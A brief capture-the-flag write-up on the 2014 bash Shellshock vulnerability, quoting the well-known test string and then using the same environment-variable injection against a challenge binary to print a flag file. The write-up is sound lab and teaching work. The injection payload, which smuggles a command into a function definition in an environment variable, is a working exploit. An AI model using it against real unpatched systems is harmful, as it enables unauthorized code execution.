# Shellshock

After googling about shellshock, we discover it's a vulnerability discovered in `bash` in 2014 allowing code execution.

Wikipedia quotes the initial report:

`$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`

We can test whether this works on our custom `bash` executable:

```bash
$ env x='() { :;}; echo vulnerable' ./bash
vulnerable
```

And then use it to get the flag:

`$ env x='() { :;}; /bin/cat ~/flag' ~/shellshock`
